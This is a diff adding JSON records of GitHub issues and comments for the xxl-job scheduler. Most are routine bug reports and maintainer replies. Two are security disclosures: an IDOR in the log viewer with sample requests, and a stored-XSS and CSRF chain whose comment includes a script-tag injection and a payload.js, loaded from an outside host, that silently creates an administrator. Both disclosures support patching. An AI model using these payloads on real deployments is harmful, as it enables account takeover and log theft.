@@ -1,4 +1,154 @@
 {
+  "id": "xuxueli/xxl-job_issue_3989_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3989,
+  "chunk_index": 0,
+  "title": "任务结果丢失，标记失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3989",
+  "text": "使用的是3.4.2版本的，脚本正常执行 也能正常退出，但是界面和数据库 就显示： 任务结果丢失，标记失败\n\n如下是脚本日志：\n```\n[2026-07-16 08:40:14] 执行成功，请前台查看数据\n0\n执行数据时间: 20260715完成。。。\n所有数据时间执行完成， end date: 20260715\nGood bye!\n2026-07-16 08:40:14 [com.xxl.job.core.thread.JobThread#run]-[174]-[xxl-job, JobThread-1011-1784161800014] \n----------- xxl-job job execute end(finish) -----------\n----------- Result: handleCode=200, handleMsg = null\n2026-07-16 08:40:14 [com.xxl.job.core.thread.TriggerCallbackThreadHelper#appendCallbackResult]-[195]-[pool-2-thread-1] \n----------- xxl-job job callback finish.\n\n[Rolling Log Finish]\n```\n```\n脚本：\n#!/bin/bash\necho \"xxl-job: hello shell\"\necho \"脚本位置：$0\"\necho \"任务参数：$1\"\necho \"分片序号 = $2\"\necho \"分片总数 = $3\"\n\n长脚本执行，大概10分钟\nxxxxx \n\nif [ \"$?\" == \"0\" ];then\n\techo \"Good bye!\"\n\texit 0\nelse\n\techo \"execute error\"\n    exit 1\nfi\n```\n注意这里输出的Good bye.\n\n我检查了时间也是一样的（我在一个docker里面的2个容器里面分别跑的admin 和 executor）",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2026-07-16T02:15:52Z",
+    "updated_at": "2026-07-16T04:29:13Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3989_4987479997_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3989,
+  "chunk_index": 0,
+  "title": "任务结果丢失，标记失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3989#issuecomment-4987479997",
+  "text": "我检查了对应的executor和admin的日志，没啥特别的异常：\nexecutor：\n```\n2026-07-16 08:00:00.014 [xxl-job, EmbedServer bizThreadPool-633758284] INFO  c.x.job.core.executor.XxlJobExecutor - >>>>>>>>>>> xxl-job register JobThread success, jobId:104, handler:com.xxl.job.core.handler.impl.ScriptJobHandler@7bb60a21\n2026-07-16 08:03:40.511 [xxl-job, JobThread-104-1784160000014] INFO  com.xxl.job.core.thread.JobThread - >>>>>>>>>>> xxl-job JobThread stoped, hashCode:Thread[#124,xxl-job, JobThread-104-1784160000014,10,main]\n2026-07-16 08:30:00.014 [xxl-job, EmbedServer bizThreadPool-1468538548] INFO  c.x.job.core.executor.XxlJobExecutor - >>>>>>>>>>> xxl-job register JobThread success, jobId:1011, handler:com.xxl.job.core.handler.impl.ScriptJobHandler@500218d4\n2026-07-16 08:41:47.537 [xxl-job, JobThread-1011-1784161800014] INFO  com.xxl.job.core.thread.JobThread - >>>>>>>>>>> xxl-job JobThread stoped, hashCode:Thread[#131,xxl-job, JobThread-1011-1784161800014,10,main]\n2026-07-16 09:35:45.615 [xxl-job, EmbedServer bizT",
+  "metadata": {
+    "author": "gaoxingliang",
+    "created_at": "2026-07-16T02:17:41Z",
+    "updated_at": "2026-07-16T02:17:41Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3989_4987479997_chunk_1",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3989,
+  "chunk_index": 1,
+  "title": "任务结果丢失，标记失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3989#issuecomment-4987479997",
+  "text": "31,xxl-job, JobThread-1011-1784161800014,10,main]\n2026-07-16 09:35:45.615 [xxl-job, EmbedServer bizThreadPool-1626953217] INFO  c.x.job.core.executor.XxlJobExecutor - >>>>>>>>>>> xxl-job register JobThread success, jobId:1011, handler:com.xxl.job.core.handler.impl.ScriptJobHandler@46904b1\n2026-07-16 09:37:18.646 [xxl-job, JobThread-1011-1784165745615] INFO  com.xxl.job.core.thread.JobThread - >>>>>>>>>>> xxl-job JobThread stoped, hashCode:Thread[#141,xxl-job, JobThread-1011-1784165745615,10,main]\n```\nadmin:\n无对应的时间输出。",
+  "metadata": {
+    "author": "gaoxingliang",
+    "created_at": "2026-07-16T02:17:41Z",
+    "updated_at": "2026-07-16T02:17:41Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3989_4988186033_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3989,
+  "chunk_index": 0,
+  "title": "任务结果丢失，标记失败",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3989#issuecomment-4988186033",
+  "text": "我看了下源码，实际上是因为手动注册的地址和执行器自动上报的地址不一致 （虽然是同一个instance 但是一个是域名地址 一个是ip地址），解决方法就是： 执行器的配置自己的：\n      - XXL_JOB_EXECUTOR_ADDRESS=http://qfxxljobexe:9999    （springboot 的环境变量 ）",
+  "metadata": {
+    "author": "gaoxingliang",
+    "created_at": "2026-07-16T04:29:12Z",
+    "updated_at": "2026-07-16T04:29:12Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3983_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3983,
+  "chunk_index": 0,
+  "title": "Authenticated IDOR in /joblog/logDetailCat lets any user read logs from any job group",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3983",
+  "text": "reported privately on 27 May 2026 via email - no response.\n\nWe found an authorization bypass in the job log viewer that lets any authenticated user read execution log content from job groups they do not belong to.\n\nAffected: xuxueli/xxl-job main, confirmed on commit 71530beac2b32bffe8b12476a595e5eefd987021. Also present in v2.4.2.\n\nRoot cause: GET /xxl-job-admin/joblog/logDetailCat (JobLogController.java:290) loads the log record from the database and proxies the log content request to the executor without checking whether the caller has permission to access the log's job group. The sibling endpoint logDetailPage (line 267) does perform this check via JobGroupPermissionUtil.validJobGroupPermission(request, jobLog.getJobGroup()) at line 277, but logDetailCat has no corresponding check. The logId parameter accepts sequential integer values, so an attacker can enumerate all log records across all groups.\n\nLive-validated against xuxueli/xxl-job-admin:2.4.2 (MySQL 8.4, default schema):\n\n1.",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2026-07-02T10:29:58Z",
+    "updated_at": "2026-07-06T13:59:16Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3983_chunk_1",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3983,
+  "chunk_index": 1,
+  "title": "Authenticated IDOR in /joblog/logDetailCat lets any user read logs from any job group",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3983",
+  "text": "ss all groups.\n\nLive-validated against xuxueli/xxl-job-admin:2.4.2 (MySQL 8.4, default schema):\n\n1. Admin account exists in job group 1 (role=1). user2 account created with permission=2 (access to job group 2 only, role=0).\n\n2. A job log record (id=1) is present in job group 1.\n\n3. Control: user2 calls logDetailPage?id=1 -- permission check fires, access denied.\n\n4. Exploit: user2 calls logDetailCat?logId=1&fromLineNum=1 -- no permission check, server loads the log record, proxies to executor, and returns log content:\n\nGET /xxl-job-admin/joblog/logDetailCat?logId=1&fromLineNum=1\nCookie: XXL_JOB_LOGIN_IDENTITY=<user2_session>\n\nResponse: {\"code\":200,\"msg\":null,\"content\":{\"fromLineNum\":1,\"toLineNum\":10,\"logContent\":\"SENSITIVE_LOG: admin_db_password=SUPER_SECRET_123\",\"end\":true}}\n\nBytecode inspection of v2.4.2 app.jar confirms logDetailCat contains no invocation of validJobGroupPermission, while pageList, clearLog, and getJobsByGroup all call it.\n\nSuggested fix: add HttpServletRequest to l",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2026-07-02T10:29:58Z",
+    "updated_at": "2026-07-06T13:59:16Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3983_chunk_2",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3983,
+  "chunk_index": 2,
+  "title": "Authenticated IDOR in /joblog/logDetailCat lets any user read logs from any job group",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3983",
+  "text": "hile pageList, clearLog, and getJobsByGroup all call it.\n\nSuggested fix: add HttpServletRequest to logDetailCat's parameter list and call JobGroupPermissionUtil.validJobGroupPermission(request, jobLog.getJobGroup()) immediately after the null check, matching the pattern already used in logDetailPage at line 277.",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2026-07-02T10:29:58Z",
+    "updated_at": "2026-07-06T13:59:16Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3983_4893658896_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3983,
+  "chunk_index": 0,
+  "title": "Authenticated IDOR in /joblog/logDetailCat lets any user read logs from any job group",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3983#issuecomment-4893658896",
+  "text": "master 分支已修复，升级即可",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-07-06T13:59:12Z",
+    "updated_at": "2026-07-06T13:59:12Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_3982_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue",
+  "source_id": 3982,
+  "chunk_index": 0,
+  "title": "gpg插件",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3982",
+  "text": "现在有个问题，我单独想对core模块进行deploy，但是gpg插件会报错，导致无法deploy到maven私服。但是去掉这个插件，登录功能又会有影响。应该怎么办？\n打包时报错：[ERROR] Failed to execute goal org.apache.maven.plugins:maven-gpg-plugin:3.2.8:sign (default) on project xxl-job-core: failed to execute gpg: Error while executing process. Cannot run program \"gpg\": error=2, No such file or directory -> [Help 1]",
+  "metadata": {
+    "state": "closed",
+    "created_at": "2026-07-01T12:38:56Z",
+    "updated_at": "2026-07-06T14:00:01Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3982_4893666058_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3982,
+  "chunk_index": 0,
+  "title": "gpg插件",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3982#issuecomment-4893666058",
+  "text": "删除插件，参考你们内部要求重新配置",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-07-06T13:59:57Z",
+    "updated_at": "2026-07-06T13:59:57Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3977_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -25,6 +175,21 @@
   "metadata": {
     "state": "closed",
     "created_at": "2026-06-18T01:18:22Z",
+    "updated_at": "2026-06-19T07:48:58Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3976_4749562696_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3976,
+  "chunk_index": 0,
+  "title": "执行器中途服务挂了，或者是发起调度时刚好执行器重启了，会出现执行时间为空的问题",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3976#issuecomment-4749562696",
+  "text": "已修复，下个版本发布",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-19T07:48:58Z",
     "updated_at": "2026-06-19T07:48:58Z"
   }
 }
@@ -224,6 +389,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3975_4750185839_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3975,
+  "chunk_index": 0,
+  "title": "Broken Access Control in `/joblog/logDetailCat` — Cross-Tenant Job Log Disclosure",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3975#issuecomment-4750185839",
+  "text": "仓库代码已修复，将跟随下个版本发布。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-19T09:11:45Z",
+    "updated_at": "2026-06-19T09:11:45Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3973_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -344,6 +524,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3973_4749562632_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3973,
+  "chunk_index": 0,
+  "title": "版本3.4.1 查看调度日志 报错",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3973#issuecomment-4749562632",
+  "text": "已修复，下个版本发布",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-19T07:48:57Z",
+    "updated_at": "2026-06-19T07:48:57Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3972_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -355,6 +550,21 @@
   "metadata": {
     "state": "closed",
     "created_at": "2026-06-13T11:27:38Z",
+    "updated_at": "2026-06-14T10:55:48Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3972_4701525776_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3972,
+  "chunk_index": 0,
+  "title": "文档中的 MySQL DriverClass 与当前配置文件不一致",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3972#issuecomment-4701525776",
+  "text": "已更新",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T10:55:48Z",
     "updated_at": "2026-06-14T10:55:48Z"
   }
 }
@@ -374,6 +584,36 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3968_4677036288_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3968,
+  "chunk_index": 0,
+  "title": "任务管理/执行器管理 全选后删除报错\"请选择一条数据\"",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3968#issuecomment-4677036288",
+  "text": "版本：3.4.0\n\n<img width=\"1278\" height=\"676\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/03d75b72-1cb6-4dd0-90a0-bf65a014d15f\" />",
+  "metadata": {
+    "author": "qingfengjack",
+    "created_at": "2026-06-11T03:55:19Z",
+    "updated_at": "2026-06-11T03:55:19Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3968_4701771074_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3968,
+  "chunk_index": 0,
+  "title": "任务管理/执行器管理 全选后删除报错\"请选择一条数据\"",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3968#issuecomment-4701771074",
+  "text": "评估执行器、任务增删操作为低频操作，建议保持选中单个。如有需求可定制。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T12:39:17Z",
+    "updated_at": "2026-06-14T12:39:17Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3967_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -389,6 +629,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3967_4702001326_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3967,
+  "chunk_index": 0,
+  "title": "Docker Desktop 中无法通过界面配置端口映射",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3967#issuecomment-4702001326",
+  "text": "新版本已支持，升级 3.4.1 版本即可。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T14:12:28Z",
+    "updated_at": "2026-06-14T14:12:28Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3965_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -400,6 +655,21 @@
   "metadata": {
     "state": "closed",
     "created_at": "2026-05-26T09:58:45Z",
+    "updated_at": "2026-06-14T12:38:12Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3965_4701768257_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3965,
+  "chunk_index": 0,
+  "title": "任务子线程内存泄漏问题",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3965#issuecomment-4701768257",
+  "text": "这里的 任务 子线程，实际为 业务自己创建的 线程池，需要业务管控生命周期。\n可以结合 任务的 init/destory 方法处理 业务线程池 的管理操作，避免资源泄漏。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T12:38:12Z",
     "updated_at": "2026-06-14T12:38:12Z"
   }
 }
@@ -434,6 +704,126 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3964_4542265775_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 0,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4542265775",
+  "text": "鸡肋。。",
+  "metadata": {
+    "author": "k0e1y",
+    "created_at": "2026-05-26T08:41:55Z",
+    "updated_at": "2026-05-26T08:41:55Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3964_4555416781_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 0,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4555416781",
+  "text": "无法复现，需要给到更详细操作步骤",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-05-27T14:23:27Z",
+    "updated_at": "2026-05-27T14:23:27Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3964_4560016568_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 0,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4560016568",
+  "text": "# step 1\n准备一个远程的服务器用于放置请求添加管理员用户的js请求代码\n例子中使用的是`http://172.22.94.96:9999`\n\n`payload.js`代码如下\n```js\nconst xhr = new XMLHttpRequest();\nxhr.onreadystatechange = function() {\n    if (this.readyState === 4) {\n       console.log('pwn')\n    }\n};\n// xhr.open(\"POST\", \"http://localhost:8080/xxl-job-admin/user/insert\", false);\nxhr.open(\"POST\", \"http://127.0.0.1:8080/xxl-job-admin/user/insert\", false);\nxhr.withCredentials = true;\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nconst params = \"username=bypass&password=bypass&role=1&permission=\";\nxhr.send(params);\n```\n\n# step 2\n一个拥有任意执行器权限的普通用户\n\n<img width=\"710\" height=\"460\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6c055a8c-0f0b-4205-954e-ffcd1f1dd359\" />\n\n新增任意一个运行模式为GLUE的任务\n\n<img width=\"3203\" height=\"1932\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/45a3d6ea-508d-4b3c-b9d8-4af8f70d5a25\" />\n\n例子中的GLUE任务id为9\n\n并通过下面的请求修改glueRemark内容\n\n<img width=\"3341\" height=\"1851\" alt=\"Image\" src=\"https://gi",
+  "metadata": {
+    "author": "v9d0g",
+    "created_at": "2026-05-28T01:15:20Z",
+    "updated_at": "2026-05-28T01:15:20Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3964_4560016568_chunk_1",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 1,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4560016568",
+  "text": "例子中的GLUE任务id为9\n\n并通过下面的请求修改glueRemark内容\n\n<img width=\"3341\" height=\"1851\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/478cd1dc-6d6c-4827-973a-a905c8b8b214\" />\n\n```sh\nid=9&glueSource=test&glueRemark=<script src=\"http://172.22.94.96:9999/payload.js\"/>\n```\n\n可以发现已经将js嵌入进去了\n\n<img width=\"3840\" height=\"2280\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/bb5b828e-5e30-434f-81d5-d3a7b82e0d3f\" />\n\n普通用户访问 触发了新增用户的请求 但是会显示没有权限\n\n<img width=\"3840\" height=\"2280\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/f8df5be3-93af-4dd3-bb3e-e947ca9edd99\" />\n\n# step 3\n管理员用户使用GLUE IDE访问被设置了脚本的任务\n此时用户管理中并没有其他用户\n\n<img width=\"3840\" height=\"2280\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/d8dedb14-0561-45b2-aff9-f7a6a697e336\" />\n\n访问\n<img width=\"3215\" height=\"760\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/21e21f6c-0841-4c0b-89cb-eeec4a853cd3\" />\n\n此时就会静默添加一个管理员用户\n\n<img width=\"3015\" height=\"1105\" alt=\"Image\" src=\"https://github.com/user-attac",
+  "metadata": {
+    "author": "v9d0g",
+    "created_at": "2026-05-28T01:15:20Z",
+    "updated_at": "2026-05-28T01:15:20Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3964_4560016568_chunk_2",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 2,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4560016568",
+  "text": "/>\n\n此时就会静默添加一个管理员用户\n\n<img width=\"3015\" height=\"1105\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1830de80-6fec-469f-ac36-bd22d8871885\" />\n\n原理和 issue 2669类似",
+  "metadata": {
+    "author": "v9d0g",
+    "created_at": "2026-05-28T01:15:20Z",
+    "updated_at": "2026-05-28T01:15:20Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3964_4656520240_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 0,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4656520240",
+  "text": "为了构造xss攻击也是煞费苦心，直接让freemarker对输出含有HTML的内容转义就好了，如配置：spring.freemarker.settings.output_format=HTML",
+  "metadata": {
+    "author": "zhoule-le",
+    "created_at": "2026-06-09T05:46:41Z",
+    "updated_at": "2026-06-09T05:46:41Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3964_4704605650_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 0,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4704605650",
+  "text": "现在黑客直接基于AI分析开源主流的中间件nacos 、xxl-job等分享各种漏洞实施攻击",
+  "metadata": {
+    "author": "mbzhao",
+    "created_at": "2026-06-15T04:37:23Z",
+    "updated_at": "2026-06-15T04:37:23Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3964_4704637198_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3964,
+  "chunk_index": 0,
+  "title": "[Security]xxl-job-admin v3.4.1 Stored XSS and CSRF Vulnerabilities Combination to Create Administrator",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3964#issuecomment-4704637198",
+  "text": "修复逻辑已经推送，升级 3.4.1 可防护。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-15T04:44:01Z",
+    "updated_at": "2026-06-15T04:44:01Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3961_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -449,6 +839,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3961_4542689394_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3961,
+  "chunk_index": 0,
+  "title": "跨版本升级支持吗？",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3961#issuecomment-4542689394",
+  "text": "支持，对比不同版本sql 脚本，补充调整个别字段即可。可以考虑opencode处理下。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-05-26T09:16:34Z",
+    "updated_at": "2026-05-26T09:16:34Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3960_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -460,6 +865,21 @@
   "metadata": {
     "state": "closed",
     "created_at": "2026-05-19T01:53:03Z",
+    "updated_at": "2026-06-14T11:52:57Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3960_4701659365_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3960,
+  "chunk_index": 0,
+  "title": "返回类型应该返回什么",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3960#issuecomment-4701659365",
+  "text": "@ xxljob(\"testJobHandler\")\npublic Void testJobHandler() throws Exception{\n}\n————————\n\n上面这种即可，当前通过 XxlJobHelper 获取属性，不依赖出入参数。",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T11:52:57Z",
     "updated_at": "2026-06-14T11:52:57Z"
   }
 }
@@ -479,6 +899,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3959_4473712690_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3959,
+  "chunk_index": 0,
+  "title": "3.4.0 XxlJobFileAppender.java callbackLogPath 没有被重新赋值",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3959#issuecomment-4473712690",
+  "text": "@xuxueli",
+  "metadata": {
+    "author": "farsunset-com",
+    "created_at": "2026-05-18T02:24:40Z",
+    "updated_at": "2026-05-18T02:24:40Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3955_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -494,6 +929,36 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3955_4402965679_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3955,
+  "chunk_index": 0,
+  "title": "Cron周里面第几周的星期几展示是否正确？",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3955#issuecomment-4402965679",
+  "text": "图片粘错了，重新添加一张图<img width=\"834\" height=\"687\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/2609fcb4-0db2-4b41-85dc-957ca9977e94\" />",
+  "metadata": {
+    "author": "tang-rabbit",
+    "created_at": "2026-05-08T03:01:53Z",
+    "updated_at": "2026-05-08T03:01:53Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3955_4701657237_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3955,
+  "chunk_index": 0,
+  "title": "Cron周里面第几周的星期几展示是否正确？",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3955#issuecomment-4701657237",
+  "text": "升级最新版，已优化",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T11:51:55Z",
+    "updated_at": "2026-06-14T11:51:55Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3952_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -505,6 +970,21 @@
   "metadata": {
     "state": "closed",
     "created_at": "2026-04-27T02:42:56Z",
+    "updated_at": "2026-06-14T11:51:37Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3952_4701656475_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3952,
+  "chunk_index": 0,
+  "title": "返回日志id优化",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3952#issuecomment-4701656475",
+  "text": "trigger 异步执行，而且分片任务会触发多个任务，当前无法实时获取logid",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T11:51:37Z",
     "updated_at": "2026-06-14T11:51:37Z"
   }
 }
@@ -524,6 +1004,21 @@
   }
 }
 {
+  "id": "xuxueli/xxl-job_issue_comment_3949_4701622987_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3949,
+  "chunk_index": 0,
+  "title": "执行器里面想要支持ip白名单控制",
+  "url": "https://github.com/xuxueli/xxl-job/issues/3949#issuecomment-4701622987",
+  "text": "可以通过token隔离，非法token过滤请求",
+  "metadata": {
+    "author": "xuxueli",
+    "created_at": "2026-06-14T11:36:43Z",
+    "updated_at": "2026-06-14T11:36:43Z"
+  }
+}
+{
   "id": "xuxueli/xxl-job_issue_3948_chunk_0",
   "repo": "xuxueli/xxl-job",
   "source_type": "issue",
@@ -536,6 +1031,36 @@
     "state": "closed",
     "created_at": "2026-04-21T08:03:39Z",
     "updated_at": "2026-06-14T11:35:26Z"
+  }
+}
+{
+  "id": "xuxueli/xxl-job_issue_comment_3948_4288213217_chunk_0",
+  "repo": "xuxueli/xxl-job",
+  "source_type": "issue_comment",
+  "source_id": 3948,
+  "chunk_index": 0,
